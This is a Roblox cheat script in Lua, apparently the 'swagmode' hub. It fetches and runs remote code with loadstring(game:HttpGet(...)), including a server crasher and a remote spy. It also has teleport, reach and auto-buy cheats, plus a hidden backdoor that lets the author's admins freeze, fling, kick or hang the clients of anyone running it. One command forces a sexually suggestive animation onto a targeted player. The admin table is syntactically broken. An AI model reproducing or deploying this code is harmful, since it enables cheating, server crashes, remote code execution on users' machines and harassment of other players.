local swagmins = {

  , -- nil

  , -- nil
  , -- nil

  , -- nil

  , -- me

   ,-- nil

}

local bending = false

local kickmsg = 'PERMA BANNED'

local function commands(msg,plr)

    if DisableMod == false or table.find(swagmins, plr) then

        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)

        local Msg = string.lower(msg)

        local SplitCMD = string.split(Msg,' ')

        local Lower = string.lower(player.Name)

        local Allowed = string.find(Lower, SplitCMD[2])

        if Allowed then

            if string.find(SplitCMD[1], ':freeze') then

                player.Character.HumanoidRootPart.Anchored = true

            end

            if string.find(SplitCMD[1], ':thaw') then

                player.Character.HumanoidRootPart.Anchored = false

            end

            if string.find(SplitCMD[1], ':benx') then

                bending = true

                local segtarget = Mod.Name

                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)

                Crouch.Looped = true

                Crouch:Play()

                local away = .5

                local reversing = false

                local shirt = player.Character:FindFirstChild('Shirt')

                local pants = player.Character:FindFirstChild('Pants')

                if shirt then

                    shirt:Destroy()

                end

                if pants then

                    pants:Destroy()

                end

                local Loop

                local loopFunction = function()

                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)

                    local character = player.Character

                    if targetchar then

                        if reversing == true then

                            away = away - 0.1

                        else

                            away = away + 0.1

                        end

                        if away >= 2 then

                            reversing = true

                        elseif away < 0.5 then

                            reversing = false

                        end

                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away

                    end

                end;

                local Start = function()

                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);

                end;

                local Pause = function()

                    Loop:Disconnect()

                    Crouch:Stop()

                end;

                Start()	                repeat wait() until bending == false

                Pause()

            end

            if string.find(SplitCMD[1], ':unbenx') then

                while bending == true do

                    wait()

                    bending = false

                end

            end

            if string.find(SplitCMD[1], ':kick') then

                local ISADMIN = table.find(swagmins, player.UserId)

                if not ISADMIN then

                    player:Kick(kickmsg)

                    wait(5)

                    while true do end

                end

            end

            if string.find(SplitCMD[1], ':bring') then

                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)

            end

            if string.find(SplitCMD[1], ':cuffban') then

                if table.find(swagmins, plr) then

                    local ISADMIN = table.find(swagmins, player.UserId)

                    if not ISADMIN then

                        player:Kick('Stop .')

                    end

                end

            end

            if string.find(SplitCMD[1], ':fling') then

                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)

            end

        else

            if string.find(msg, '/e test') then

                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');

            end

        end

    end

end

muted = {}

mutingnew = false 

local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/swagmode/swagmode/main/modlist'))()

Players.PlayerAdded:Connect(function(plr)

    local SWAGMIN = table.find(swagmins, plr.UserId)

    if SWAGMIN or ModCheck[plr.UserId] then

        plr.Chatted:Connect(function(msg)

            commands(msg, plr.UserId)

        end)

    end

    if muteingnew == true then

        if not table.find(muted, plr.Name) then

            table.insert(muted, plr.Name)

            print('automuted ' .. plr.Name)

        end

    end

end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do

    local SWAGMIN = table.find(swagmins, v.UserId)

    if SWAGMIN or ModCheck[v.UserId] then

        v.Chatted:Connect(function(msg)

           commands(msg, v.UserId)

        end)

    end

end

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

    local commands = {}

    

    local prefix = "/"

    local function findPlayer(name)

        for _, Player in ipairs(Players:GetPlayers()) do

            if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then

                return Player;

            end

        end

    end

    

    commands.e = function(arguments)

        local CMD = arguments[1]

        

        if CMD == 'rejoin' or CMD == 'rj' then

            Players.LocalPlayer:Kick("Rejoining")

		    wait()

		    game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)

        end

        if CMD == 'serverhop' or CMD == 'shop' then

        	local x = {}

        	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do

        		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then

        			x[#x + 1] = v.id

        		end

        	end

        	if #x > 0 then

        		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])

        	else

        		print('failed to find server')

        	end

        end

        

        local ANIMATIONS = false

        if CMD == 'animations' and player.PlayerGui.MainScreenGui.AnimationPack.Visible == false and ANIMATIONS == false then

            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

            ANIMATIONS = true

            local AnimationsFolder = Instance.new('Folder', game.Workspace)

            local LeanAni = Instance.new('Animation', AnimationsFolder)

            LeanAni.AnimationId = 'rbxassetid://3152375249'

            local Lean = Humanoid:LoadAnimation(LeanAni)

            local LayAni = Instance.new('Animation', AnimationsFolder)

            LayAni.AnimationId = 'rbxassetid://3152378852'

            local Lay = Humanoid:LoadAnimation(LayAni)

            local Dance1Ani = Instance.new('Animation', AnimationsFolder)

            Dance1Ani.AnimationId = 'rbxassetid://3189773368'

            local Dance1 = Humanoid:LoadAnimation(Dance1Ani)

            local Dance2Ani = Instance.new('Animation', AnimationsFolder)

            Dance2Ani.AnimationId = 'rbxassetid://3189776546'

            local Dance2 = Humanoid:LoadAnimation(Dance2Ani)

            local GreetAni = Instance.new('Animation', AnimationsFolder)

            GreetAni.AnimationId = 'rbxassetid://3189777795'

            local Greet = Humanoid:LoadAnimation(GreetAni)

            local PrayAni = Instance.new('Animation', AnimationsFolder)

            PrayAni.AnimationId = 'rbxassetid://3487719500'

            local Pray = Humanoid:LoadAnimation(PrayAni)

            Close.Visible = false

            ScrollingFrame.Visible = false

            Animations.Visible = true

            

            Animations.MouseButton1Click:Connect(function()

                ScrollingFrame.Visible = true

                Close.Visible = true

            end)

            Close.MouseButton1Click:Connect(function()

                ScrollingFrame.Visible = false

                Close.Visible = false

            end)

            LeanButton.MouseButton1Click:Connect(function()

                Lean:Play()

            end)

            LayButton.MouseButton1Click:Connect(function()

                Lay:play()

            end)

            Dance1Button.MouseButton1Click:Connect(function()

                Dance1:Play()

            end)

            Dance2Button.MouseButton1Click:Connect(function()

                Dance2:Play()

            end)

            GreetButton.MouseButton1Click:Connect(function()

                Greet:Play()

            end)

            PrayButton.MouseButton1Click:Connect(function()

                Pray:Play()

            end)

            

            Humanoid.Running:Connect(function()

                Lean:Stop()

                Lay:Stop()

                Dance1:Stop()

                Dance2:Stop()

                Greet:Stop()

                Pray:Stop()

                ChestPump:Stop()

            end)

        end

        if CMD == 'korblox' then

            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightLowerLeg:Destroy()

            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightUpperLeg:Destroy()

            game:GetService("Workspace").Players:FindFirstChild(player.Name).RightFoot:Destroy()

        end

        if CMD == 'crash' then

            loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()

        end

        if CMD == 'lettuce' then

            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

            local LettuceTool = Instance.new('Tool', player.Backpack)

            LettuceTool.RequiresHandle = false

            LettuceTool.CanBeDropped = true

            LettuceTool.Name = 'Lettuce'

            LettuceTool.ToolTip = 'inf lettuce eater yummy'

            

            local function eat()

                local Food = player.Backpack:FindFirstChild('[Lettuce]')

                if Food and player.Character.BodyEffects.Attacking.Value == false then

                    Humanoid:EquipTool(Food)

                    player.Character:FindFirstChildWhichIsA('Tool'):Activate()

                    repeat wait() until player.Character.BodyEffects.Attacking.Value == false

                    Humanoid:EquipTool(LettuceTool)

                    

                end

            end

            

            LettuceTool.Activated:Connect(function()

                eat()

            end)

            LettuceTool.Equipped:Connect(function()

                while player.Character:FindFirstChild('Lettuce') do

                    wait()

                    local pathto = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"].Head

                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')

                    if HRP and player.Character:FindFirstChild('Lettuce') then

                        local Away = (HRP.Position - pathto.Position).Magnitude

                        if Away <= 30 then

                            for i,v in pairs(player.Backpack:GetChildren()) do

                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

                                if v.Name == '[Lettuce]' then

                                    v.Parent = player.Character

                                end

                            end

                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))

                        end

                    end

                end

            end)

        end

        

        if CMD == 'fov' then

            if game.Workspace:FindFirstChildWhichIsA('Camera') then

                game.Workspace:FindFirstChildWhichIsA('Camera').FieldOfView = tonumber(arguments[2])

            end

        end

        

        BRIGHT = false

        if CMD == 'bright' or CMD == 'unbright' then

            if BRIGHT == false then

                BRIGHT = true

                game:GetService("Lighting").GlobalShadows = false

            else

                BRIGHT = false

                game:GetService("Lighting").GlobalShadows = true

            end

        end

        

        if CMD == 'tool' or CMD == 'tools' then

            for i,v in pairs(game:GetService("Workspace").Ignored.ItemsDrop:GetChildren()) do

                player.Character.HumanoidRootPart.CFrame = v.CFrame

                wait(0.01)

            end

        end

        

        if CMD == 'zoom' or CMD == 'infzoom' then

            player.CameraMaxZoomDistance = math.huge

        end

        

        FOG = false

        if CMD == 'fog' then

            if FOG == false then

                FOG = true

                game:GetService("Lighting").FogEnd = 5000

            else

                FOG = false

                game:GetService("Lighting").FogEnd = 500

            end

        end

        

    	if CMD == 'set' then

    	    local plrtotarget = arguments[2]

    	    if plrtotarget then

    		    local playr = findPlayer(plrtotarget)

    		    if playr then

                    TargetTextbox.Text = playr.Name

                    SetPlayerInfo()

    		    end

    	    end

    	end   

    	

    	if CMD == 'float' then

            if player.Character:FindFirstChildWhichIsA('Tool') then

                if player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui') then

                    player.Character:FindFirstChildWhichIsA('Tool'):FindFirstChild('Handle'):FindFirstChildWhichIsA('BillboardGui'):Destroy()

                end

            end

    	end

    	  

    	if CMD == 'to' then

        	local playerToTeleportToName = arguments[2]

    	    if playerToTeleportToName then

    		    local plrToTPTo = findPlayer(playerToTeleportToName)

    		    if plrToTPTo then

    			    game:GetService('Workspace').Players:WaitForChild(player.Name).HumanoidRootPart.CFrame = game:GetService('Workspace').Players:WaitForChild(plrToTPTo.Name).HumanoidRootPart.CFrame

    			    if not player.Character.LeftHand:FindFirstChild('LeftWrist') then

                        player.Character.LeftHand.CFrame = player.Character.HumanoidRootPart.CFrame

                        player.Character.RightHand.CFrame = player.Character.HumanoidRootPart.CFrame

                    end

    		    end

    	    end

    	end

    	

    	if CMD == 'sit' then

    	    game.Players.LocalPlayer.Character.Humanoid.Sit = true

    	end

    	

    	if CMD == 'recoil' then

    	    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do

                if v:IsA('Camera') then

                v:Destroy()

                end

            end

            local newcam = Instance.new('Camera')

            newcam.Parent = game:GetService('Workspace')

            newcam.Name = 'Camera'

            newcam.CameraType = 'Custom'

            newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')

            newcam.HeadLocked = true

            newcam.HeadScale = 1

        	    

    	end

    

    	if CMD == 'headless' then

    	    player.Character.Head:BreakJoints()

    	    player.Character.Head.Position = Vector3.new(0,99999999999999,0)

    	end

    	

        if CMD == 'hideboombox' or CMD == 'boombox' then

            player.Character.BOOMBOXHANDLE:Destroy()

        end

        

    	if CMD == 'reach' or CMD == 'toolreach' then

    	    if player.Character:FindFirstChildWhichIsA('Tool') then

    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)

    	        player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1

    	    end

    	end

    	if CMD == 'taser' then

    	    player.Character.HumanoidRootPart.CFrame = CFrame.new(-271.194, 21.8, -103.052)

            local LettuceTool = Instance.new('Tool', player.Backpack)

            LettuceTool.RequiresHandle = false

            LettuceTool.CanBeDropped = true

            LettuceTool.Name = 'Taser'

            LettuceTool.ToolTip = 'tazer'

            

            local function eat()

                hold:Play()

                for i,v in pairs(player.Backpack:GetChildren()) do

                    if v.Name == '[Taser]' then

                        v.Parent = player.Character

                    end

                end

                for i,v in pairs(player.Character:GetChildren()) do

                    if v.Name == '[Taser]' then

                        v:Activate()

                    end

                end

            end

            

            LettuceTool.Activated:Connect(function()

                eat()

            end)

            LettuceTool.Unequipped:Connect(function()

                

            end)

            LettuceTool.Equipped:Connect(function()

                while player.Character:FindFirstChild('Taser') do

                    local a = 0

                    for i,v in pairs(player.Character:GetChildren()) do

                        if v.Name == '[Taser]' then

                            a = a + 1

                        end

                    end

                    LettuceTool.ToolTip = tostring(a)

                    wait(3)

                end

            end)

            coroutine.resume(coroutine.create(function()

                local pathto = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head

                while wait(0.05) do

                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')

                    if sus then

                        sus:Destroy()

                    end

                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')

                    if HRP and player.Character:FindFirstChild('Taser') then

                        local Away = (HRP.Position - pathto.Position).Magnitude

                        if Away <= 30 then

                            for i,v in pairs(player.Backpack:GetChildren()) do

                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

                                if v.Name == '[Taser]' then

                                    v.Parent = player.Character

                                end

                            end

                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))

                        end

                    end

                end

            end))

        end

            	

    	if CMD == 'view' then

    	    local plrtoview = arguments[2]

            if plrtoview then

                local ptv = findPlayer(plrtoview)

                if ptv then  

                    local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')

                    View.Text = "Unview"

                    repeat view(ptv.Name) until View.Text == 'View' 

                    Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')

                end

            end

    	end

    

        if CMD == 'unview' then

            local Camera = game.Workspace:FindFirstChildWhichIsA('Camera')

            Camera.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')

            View.Text = "View"

        end

        

        if CMD == 'shield' then

            if IsMod == true then

                DisableMod = true

                notify('Immune to mod powers', '', 4)

            end

        end

        if CMD == 'unshield' then

            if IsMod == true then

                DisableMod = false

                notify('Unimmune to mod powers', '', 4)

            end

        end

        if CMD == 're' then

            player.Character:Destroy()

        end

        if CMD == 'ping' then

            while wait() do

                local Animations = game.Players.LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('AnimationPack')  

                if Animations then

                    Animations.TextScaled = true

                    Animations.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()

                end

            end

        end

        

        if CMD == 'faceless' or CMD == 'noface' then

            player.Character.Head.face:Destroy()

        end

        

        if CMD == 'hidemask' then

            player.Character:FindFirstChild('In-gameMask').Handle:Destroy()

        end

        if CMD == 'names' then

            local function checkdisplay()

                for i,v in pairs(game:GetService('Workspace').Players:GetChildren()) do

                    if v.Name ~= game.Players:FindFirstChild(v.Name).DisplayName then

                        if v:FindFirstChild('UpperTorso'):FindFirstChild('OriginalSize') or v:FindFirstChild('LowerTorso'):FindFirstChild('OriginalSize') then

                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = (game.Players:FindFirstChild(v.Name).DisplayName .. ' / ' .. v.Name)

                        end

                    end

                end

            end

            checkdisplay()

        end

        if CMD == 'remotespy' then

            loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()

        end

        if CMD == 'flashlight' then

            local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

            local mouse = player:GetMouse()

            local hold = player.Character.Humanoid:LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.SmallGunAim)

            

            local LettuceTool = Instance.new('Tool', player.Backpack)

            LettuceTool.RequiresHandle = false

            LettuceTool.CanBeDropped = true

            LettuceTool.Name = 'Flashlight'

            LettuceTool.ToolTip = 'rpg'

            local gun = '[Flashlight]'

            

            local function eat()

                hold:Play()

                for i,v in pairs(player.Backpack:GetChildren()) do

                    if v.Name == gun then

                        v.Parent = player.Character

                    end

                end

                wait(0.2)

                for i,v in pairs(player.Character:GetChildren()) do

                    if v.Name == gun then

                        v:Activate()

                    end

                end

            end

            LettuceTool.Activated:Connect(function()

                eat()

            end)

            LettuceTool.Unequipped:Connect(function()

                hold:Stop()

            end)

            LettuceTool.Equipped:Connect(function()

                hold:Play()

                local ammo = 0

                for i,v in pairs(player.Backpack:GetChildren()) do

                    if v.Name == gun then

                        ammo = ammo + v.Ammo.Value

                    end

                end

                LettuceTool.ToolTip = ammo

            end)

            coroutine.resume(coroutine.create(function()

                local pathto = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"].Head

                while wait(0.05) do

                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')

                    if sus then

                        sus:Destroy()

                    end

                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')

                    if HRP and player.Character:FindFirstChild('Flashlight') then

                        local Away = (HRP.Position - pathto.Position).Magnitude

                        if Away <= 30 then

                            for i,v in pairs(player.Backpack:GetChildren()) do

                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

                                if v.Name == '[Flashlight]' then

                                    v.Parent = player.Character

                                end

                            end

                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))

                        end

                    end

                end

            end))

        end

        if CMD == 'nuke' then

            local LettuceTool = Instance.new('Tool', player.Backpack)

            LettuceTool.RequiresHandle = false

            LettuceTool.CanBeDropped = true

            LettuceTool.Name = 'Nuke'

            LettuceTool.ToolTip = 'tazer'

            

            local function eat()

                hold:Play()

                for i,v in pairs(player.Backpack:GetChildren()) do

                    if v.Name == '[Grenade]' then

                        v.Parent = player.Character

                    end

                end

                for i,v in pairs(player.Character:GetChildren()) do

                    if v.Name == '[Grenade]' then

                        v:Activate()

                        v:Activate()

                    end

                end

        

            end

            

            LettuceTool.Activated:Connect(function()

                eat()

                for i,v in pairs(game.Workspace.Ignored:GetChildren()) do

                    if v.Name == 'Handle' then

                        v.Position = mouse.Hit.p

                    end

                end

            end)

            LettuceTool.Unequipped:Connect(function()

                hold:Stop()

            end)

            LettuceTool.Equipped:Connect(function()

                while player.Character:FindFirstChild('Nuke') do

                    local a = 0

                    for i,v in pairs(player.Character:GetChildren()) do

                        if v.Name == '[Grenade]' then

                            a = a + 1

                        end

                    end

                    LettuceTool.ToolTip = tostring(a)

                    wait(3)

                end

            end)

            coroutine.resume(coroutine.create(function()

                local pathto = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"].Head

                while wait(0.05) do

                    local sus = game:GetService("Players"):FindFirstChild(player.Name).PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')

                    if sus then

                        sus:Destroy()

                    end

                    local HRP = player.Character:FindFirstChild('HumanoidRootPart')

                    if HRP and player.Character:FindFirstChild('Nuke') then

                        local Away = (HRP.Position - pathto.Position).Magnitude

                        if Away <= 30 then

                            for i,v in pairs(player.Backpack:GetChildren()) do

                                local Humanoid = player.Character:FindFirstChildWhichIsA('Humanoid')

                                if v.Name == '[Grenade]' then

                                    v.Parent = player.Character

                                end

                            end

                            fireclickdetector(pathto.Parent:FindFirstChild('ClickDetector'))

                        end

                    end

                end

            end))

        end

        if CMD == 'mute' then

            if tostring(arguments[2]) == 'all' then

                muteingnew = true

                for _,v in pairs(Players:GetChildren()) do

                    if not table.find(muted, v.Name) then

                        table.insert(muted, v.Name)

                        print('muted ' .. v.Name)

                    end

                end

            else

                local plrtoview = arguments[2]

                if plrtoview then

                    local ptv = findPlayer(plrtoview)

                    if ptv then  

                        if not table.find(muted, ptv.Name) then

                            table.insert(muted, ptv.Name)

                            print('manualy muted ' .. ptv.Name)

                        end

                    end

                end

            end

        end

        

        coroutine.resume(coroutine.create(function()

            local function mute()

                for i,v in pairs(Players:GetChildren()) do

                    if table.find(muted, v.Name) then

                        if v.Character then

                            if v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND') and v.Character.UpperTorso:FindFirstChild('OriginalSize') then

                                v.Character.LowerTorso:FindFirstChild('BOOMBOXSOUND'):Stop()

                            end

                        end

                    end

                end

            end

            while wait(.2) do

                local success,err = pcall(mute)

            end

        end))

        

        if CMD == 'unmute' then

            if tostring(arguments[2]) == 'all' then

                muteingnew = false

                for _,v in pairs(Players:GetChildren()) do

                    if table.find(muted, v.Name) then

                        local removemute = table.find(muted, v.Name)

                        table.remove(muted, removemute)

                        print('unmuteed ' .. v.Name)

                    end

                end

            else

                local plrtoview = arguments[2]

                if plrtoview then

                    local ptv = findPlayer(plrtoview)

                    if ptv then  

                        if table.find(muted, ptv.Name) then

                            local removemute = table.find(muted, ptv.Name)

                            table.remove(muted, removemute)

                            print('unmuteed ' .. ptv.Name)

                        end

                    end

                end

            end

        end

        if CMD == 'buy' then

            local itemtobuy = nil

            local itemtobuyammofor = nil

            local ammomodel = nil

            local oldpos = player.Character.HumanoidRootPart.CFrame

            local Cash = player.DataFolder.Currency.Value

            for i,v in pairs(game:GetService('Workspace').Ignored.Shop:GetChildren()) do

                if itemtobuy == nil then

                    if string.find(string.lower(v.Name), arguments[2]) and not string.find(v.Name, 'Ammo') and itemtobuy == nil then

                        if arguments[2] == 'shotgun' then

                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1250"]

                        elseif arguments[2] == 'tacshotgun' or arguments[2] == 'tacticalshotgun' then

                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1750"]

                        elseif arguments[2] == 'key' then

                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Key] - $125"]

                        else

                            itemtobuy = v

                        end

                    end

                    if itemtobuy then

                        if string.find(itemtobuy.Name, 'Mask') then

                            itemtobuy = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $25"]

                        end

                        local pricesplit = string.split(itemtobuy.Name, '$')

                        local itemnamesplit = string.split(itemtobuy.Name, '-')

                        local price = tonumber(pricesplit[2])

                        local name = string.gsub(tostring(itemnamesplit[1]), " ", "")

                        print(name)

                        local function buygun()

                            wait()

                            Cash = player.DataFolder.Currency.Value

                            player.Character.HumanoidRootPart.CFrame = itemtobuy.Head.CFrame

                            fireclickdetector(itemtobuy.ClickDetector)

                        end

                        if name == '[MoneyGun]' then

                            repeat buygun() until player.Backpack:FindFirstChild('[Money Gun]') or Cash < price

                        elseif name == '[Double' then

                            repeat buygun() until player.Backpack:FindFirstChild('[Double-Barrel SG]') or Cash < price

                        elseif name == '[SurgeonMask]' then

                            repeat buygun() until player.Backpack:FindFirstChild('[Surgeon Mask]') or Cash < price

                        elseif name ~= '[MediumArmor]' then

                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price

                        else

                            repeat buygun() until player.Backpack:FindFirstChild(name) or Cash < price or player.Character.BodyEffects.Armor.Value == 100

                        end

                        player.Character.HumanoidRootPart.CFrame = oldpos

                    end

                end

            end

        end

    end

player.Chatted:Connect(function(message,recipient)

    message = string.lower(message)

    local splitString = message:split(" ") -- Will Split String when space

    local slashCommand = splitString[1] 

    local cmd = slashCommand:split(prefix)	

    local cmdName = cmd[2]	

    if commands[cmdName] then

    	local arguments = {} 

    	for i = 2, #splitString, 1 do

    	   table.insert(arguments,splitString[i])			

    	end

    commands[cmdName](arguments)

    end

end)

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------------------------------------------------------------------------------

wait(5)

if ModCheck[player.UserId] then

    IsMod = true

    DisableMod = true

    notify('Granted Mod Powers', 'you are immune to mod powers | type /e noshield or /e shield to toggle', 10)

elseif table.find(swagmins, player.UserId) then

    notify('Granted Admin Powers', 'hi :3', 10)

    IsMod = false

    DisableMod = false

else

    IsMod = false

    DisableMod = false

    notify('Commands Loaded', 'join discord.gg/swagmode for a list of commands', 10)

end
